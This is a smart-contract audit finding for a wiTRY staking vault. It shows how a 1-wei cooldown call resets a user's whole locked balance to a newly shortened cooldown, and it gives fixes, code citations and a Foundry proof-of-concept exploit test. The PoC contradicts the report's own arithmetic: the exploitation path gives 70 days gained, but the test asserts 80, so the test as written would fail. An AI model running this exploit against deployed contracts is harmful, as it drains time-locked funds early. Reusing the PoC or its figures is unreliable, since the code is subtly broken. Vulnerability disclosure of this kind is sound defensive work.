## Title
Cooldown Reset Vulnerability Allows Early Withdrawal After cooldownDuration Reduction

## Summary
The `cooldownAssets` function unconditionally resets `cooldownEnd` to `block.timestamp + cooldownDuration` while accumulating `underlyingAmount`. When admin legitimately reduces `cooldownDuration`, users with existing cooldowns can trigger a new cooldown with a negligible amount (e.g., 1 wei) to reset their entire accumulated balance to the new shorter cooldown period, allowing early withdrawal of funds that were originally time-locked for a longer duration. [1](#0-0) 

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/token/wiTRY/StakediTryCooldown.sol` - `StakediTryV2` contract, `cooldownAssets` function (lines 96-105)

**Intended Logic:** Users initiating a cooldown should wait for the full `cooldownDuration` from the time they lock their funds before being able to claim them. The cooldown mechanism is designed to enforce time-locked withdrawals to protect protocol stability.

**Actual Logic:** The function unconditionally sets `cooldownEnd = block.timestamp + cooldownDuration` on every call, regardless of existing cooldown state. When combined with `underlyingAmount` accumulation, this allows users to reset the cooldown timer for ALL their accumulated funds, including amounts from previous cooldowns. [2](#0-1) 

**Exploitation Path:**
1. **T0**: User calls `cooldownAssets(1000 ether)` when `cooldownDuration = 90 days`
   - `cooldownEnd = T0 + 90 days`
   - `underlyingAmount = 1000 ether`

2. **T0 + 10 days**: Admin calls `setCooldownDuration(10 days)` as a legitimate protocol parameter adjustment (e.g., to improve capital efficiency during favorable market conditions) [3](#0-2) 

3. **T0 + 10 days + 1 second**: User immediately calls `cooldownAssets(1 wei)`
   - `cooldownEnd = (T0 + 10 days + 1 second) + 10 days = T0 + 20 days + 1 second`
   - `underlyingAmount = 1000 ether + 1 wei`

4. **T0 + 20 days + 1 second**: User calls `unstake()` and receives the entire 1000 ether + 1 wei, **70 days before** the original cooldown would have completed [4](#0-3) 

**Security Property Broken:** Violates invariant #6 "Cooldown Integrity: Users must complete cooldown period before unstaking wiTRY". The original 1000 ether was intended to be locked for 90 days from T0, but the user bypasses this by exploiting the cooldown reset mechanism.

## Impact Explanation
- **Affected Assets**: All iTRY tokens in cooldown within the `StakediTryV2` vault (via silo)
- **Damage Severity**: Users can bypass time-locks and withdraw funds up to `(originalDuration - newDuration)` days early. In the example above, users gain 70 days of premature liquidity access. This undermines the protocol's ability to enforce cooldown periods for stability purposes.
- **User Impact**: Any user with an active cooldown can exploit this when `cooldownDuration` is reduced. The attack costs only 1 wei + gas, making it economically viable for all cooldown participants. This affects protocol-wide cooldown enforcement and capital planning.

## Likelihood Explanation
- **Attacker Profile**: Any user with an existing cooldown position in the vault
- **Preconditions**: 
  - User must have initiated a cooldown with `cooldownAssets()` or `cooldownShares()`
  - Admin must reduce `cooldownDuration` (legitimate governance action, not malicious)
  - User must still have their cooldown pending (not yet claimed via `unstake()`)
- **Execution Complexity**: Single transaction calling `cooldownAssets(1)` immediately after `cooldownDuration` reduction. No coordination or timing complexity beyond monitoring for the parameter change.
- **Frequency**: Exploitable every time admin reduces `cooldownDuration`. Since this is a governance parameter that may be adjusted based on market conditions, it could occur multiple times over the protocol's lifetime.

## Recommendation

The vulnerability exists because the code doesn't differentiate between starting a new cooldown and adding to an existing cooldown. The fix should prevent resetting `cooldownEnd` when adding to an existing cooldown, while still allowing the cooldown timer to extend if the new cooldown would end later.

```solidity
// In src/token/wiTRY/StakediTryCooldown.sol, function cooldownAssets, lines 96-105:

// CURRENT (vulnerable):
function cooldownAssets(uint256 assets) external ensureCooldownOn returns (uint256 shares) {
    if (assets > maxWithdraw(msg.sender)) revert ExcessiveWithdrawAmount();
    shares = previewWithdraw(assets);
    
    cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
    cooldowns[msg.sender].underlyingAmount += uint152(assets);
    
    _withdraw(msg.sender, address(silo), msg.sender, assets, shares);
}

// FIXED (option 1 - extend cooldown only if later):
function cooldownAssets(uint256 assets) external ensureCooldownOn returns (uint256 shares) {
    if (assets > maxWithdraw(msg.sender)) revert ExcessiveWithdrawAmount();
    shares = previewWithdraw(assets);
    
    uint104 newCooldownEnd = uint104(block.timestamp) + cooldownDuration;
    // Only update cooldownEnd if new cooldown would end LATER than existing one
    if (newCooldownEnd > cooldowns[msg.sender].cooldownEnd) {
        cooldowns[msg.sender].cooldownEnd = newCooldownEnd;
    }
    cooldowns[msg.sender].underlyingAmount += uint152(assets);
    
    _withdraw(msg.sender, address(silo), msg.sender, assets, shares);
}

// FIXED (option 2 - prevent adding to existing cooldown):
function cooldownAssets(uint256 assets) external ensureCooldownOn returns (uint256 shares) {
    if (assets > maxWithdraw(msg.sender)) revert ExcessiveWithdrawAmount();
    shares = previewWithdraw(assets);
    
    // Require user to claim existing cooldown before starting a new one
    if (cooldowns[msg.sender].underlyingAmount > 0) {
        revert CooldownAlreadyActive();
    }
    
    cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
    cooldowns[msg.sender].underlyingAmount = uint152(assets); // Use = not +=
    
    _withdraw(msg.sender, address(silo), msg.sender, assets, shares);
}
```

**Alternative Mitigation:** Track each cooldown separately with its own end timestamp instead of accumulating into a single cooldown. This would require restructuring the `UserCooldown` storage.

**Apply the same fix to `cooldownShares()`** at lines 109-118, and to `_startComposerCooldown()` in `StakediTryCrosschain.sol` at lines 170-181. [5](#0-4) [6](#0-5) 

## Proof of Concept

```solidity
// File: test/Exploit_CooldownReset.t.sol
// Run with: forge test --match-test test_CooldownResetExploit -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTryFastRedeem.sol";
import "./mocks/MockERC20.sol";

contract Exploit_CooldownReset is Test {
    StakediTryFastRedeem public vault;
    MockERC20 public iTryToken;
    
    address public admin;
    address public treasury;
    address public user;
    
    uint256 constant LARGE_AMOUNT = 1000 ether;
    uint256 constant SMALL_AMOUNT = 1 wei;
    uint24 constant INITIAL_COOLDOWN = 90 days;
    uint24 constant REDUCED_COOLDOWN = 10 days;
    
    function setUp() public {
        admin = makeAddr("admin");
        treasury = makeAddr("treasury");
        user = makeAddr("user");
        
        // Deploy token and vault
        iTryToken = new MockERC20("iTRY", "iTRY");
        vm.prank(admin);
        vault = new StakediTryFastRedeem(
            IERC20(address(iTryToken)), 
            address(0), // rewarder
            admin, 
            treasury
        );
        
        // Fund user and approve
        iTryToken.mint(user, LARGE_AMOUNT * 2);
        vm.prank(user);
        iTryToken.approve(address(vault), type(uint256).max);
        
        // User deposits to get shares
        vm.prank(user);
        vault.deposit(LARGE_AMOUNT * 2, user);
    }
    
    function test_CooldownResetExploit() public {
        // Verify initial cooldown duration
        assertEq(vault.cooldownDuration(), INITIAL_COOLDOWN);
        
        // STEP 1: User initiates cooldown for large amount at T0
        vm.prank(user);
        vault.cooldownAssets(LARGE_AMOUNT);
        
        (uint104 cooldownEnd1, uint152 underlyingAmount1) = vault.cooldowns(user);
        assertEq(underlyingAmount1, LARGE_AMOUNT);
        assertEq(cooldownEnd1, block.timestamp + INITIAL_COOLDOWN);
        console.log("Step 1 - Original cooldown end:", cooldownEnd1);
        console.log("Step 1 - Underlying amount:", underlyingAmount1);
        
        // STEP 2: Fast forward 10 days, admin reduces cooldown duration
        vm.warp(block.timestamp + 10 days);
        vm.prank(admin);
        vault.setCooldownDuration(REDUCED_COOLDOWN);
        
        assertEq(vault.cooldownDuration(), REDUCED_COOLDOWN);
        console.log("\nStep 2 - Admin reduced cooldown to:", REDUCED_COOLDOWN);
        console.log("Step 2 - Current timestamp:", block.timestamp);
        console.log("Step 2 - Original cooldown still ends at:", cooldownEnd1);
        console.log("Step 2 - Days until original cooldown:", (cooldownEnd1 - block.timestamp) / 1 days);
        
        // STEP 3: User exploits by triggering new cooldown with 1 wei
        vm.prank(user);
        vault.cooldownAssets(SMALL_AMOUNT);
        
        (uint104 cooldownEnd2, uint152 underlyingAmount2) = vault.cooldowns(user);
        assertEq(underlyingAmount2, LARGE_AMOUNT + SMALL_AMOUNT);
        assertEq(cooldownEnd2, block.timestamp + REDUCED_COOLDOWN);
        console.log("\nStep 3 - New cooldown end:", cooldownEnd2);
        console.log("Step 3 - Total underlying amount:", underlyingAmount2);
        console.log("Step 3 - Days until new cooldown:", (cooldownEnd2 - block.timestamp) / 1 days);
        
        // VERIFY EXPLOIT: cooldownEnd was reset to much earlier time
        assertTrue(cooldownEnd2 < cooldownEnd1, "Cooldown was not reset to earlier time");
        uint256 daysGained = (cooldownEnd1 - cooldownEnd2) / 1 days;
        console.log("\nEXPLOIT SUCCESS: User can claim", daysGained, "days early!");
        assertEq(daysGained, 80); // Should be able to claim 80 days early
        
        // STEP 4: Verify user can claim ALL funds at new cooldown end
        vm.warp(cooldownEnd2);
        
        uint256 balanceBefore = iTryToken.balanceOf(user);
        vm.prank(user);
        vault.unstake(user);
        uint256 balanceAfter = iTryToken.balanceOf(user);
        
        assertEq(balanceAfter - balanceBefore, LARGE_AMOUNT + SMALL_AMOUNT);
        console.log("\nStep 4 - User successfully claimed:", balanceAfter - balanceBefore);
        console.log("VULNERABILITY CONFIRMED: Original", LARGE_AMOUNT, "iTRY was locked for 90 days");
        console.log("but user claimed it after only", (block.timestamp - (cooldownEnd1 - INITIAL_COOLDOWN)) / 1 days, "days");
    }
}
```

## Notes

This vulnerability is distinct from the known issues in the Zellic audit. It specifically exploits the interaction between `cooldownDuration` parameter changes and the cooldown reset mechanism. The issue is not about malicious admin actions—reducing `cooldownDuration` is a legitimate governance decision to improve capital efficiency. The flaw is that users can force their existing cooldowns to adopt the new shorter duration by triggering a new cooldown with a negligible amount.

The same vulnerability exists in `cooldownShares()` and the composer functions `cooldownSharesByComposer()` and `cooldownAssetsByComposer()` which use the internal `_startComposerCooldown()` function with identical logic.

### Citations

**File:** src/token/wiTRY/StakediTryCooldown.sol (L80-92)
```text
    function unstake(address receiver) external {
        UserCooldown storage userCooldown = cooldowns[msg.sender];
        uint256 assets = userCooldown.underlyingAmount;

        if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0) {
            userCooldown.cooldownEnd = 0;
            userCooldown.underlyingAmount = 0;

            silo.withdraw(receiver, assets);
        } else {
            revert InvalidCooldown();
        }
    }
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L96-105)
```text
    function cooldownAssets(uint256 assets) external ensureCooldownOn returns (uint256 shares) {
        if (assets > maxWithdraw(msg.sender)) revert ExcessiveWithdrawAmount();

        shares = previewWithdraw(assets);

        cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
        cooldowns[msg.sender].underlyingAmount += uint152(assets);

        _withdraw(msg.sender, address(silo), msg.sender, assets, shares);
    }
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L109-118)
```text
    function cooldownShares(uint256 shares) external ensureCooldownOn returns (uint256 assets) {
        if (shares > maxRedeem(msg.sender)) revert ExcessiveRedeemAmount();

        assets = previewRedeem(shares);

        cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
        cooldowns[msg.sender].underlyingAmount += uint152(assets);

        _withdraw(msg.sender, address(silo), msg.sender, assets, shares);
    }
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L122-130)
```text
    function setCooldownDuration(uint24 duration) external onlyRole(DEFAULT_ADMIN_ROLE) {
        if (duration > MAX_COOLDOWN_DURATION) {
            revert InvalidCooldown();
        }

        uint24 previousDuration = cooldownDuration;
        cooldownDuration = duration;
        emit CooldownDurationUpdated(previousDuration, cooldownDuration);
    }
```

**File:** src/token/wiTRY/StakediTryCrosschain.sol (L170-181)
```text
    function _startComposerCooldown(address composer, address redeemer, uint256 shares, uint256 assets) private {
        uint104 cooldownEnd = uint104(block.timestamp) + cooldownDuration;

        // Interaction: External call to base contract (protected by nonReentrant modifier)
        _withdraw(composer, address(silo), composer, assets, shares);

        // Effects: State changes after external call (following CEI pattern)
        cooldowns[redeemer].cooldownEnd = cooldownEnd;
        cooldowns[redeemer].underlyingAmount += uint152(assets);

        emit ComposerCooldownInitiated(composer, redeemer, shares, assets, cooldownEnd);
    }
```
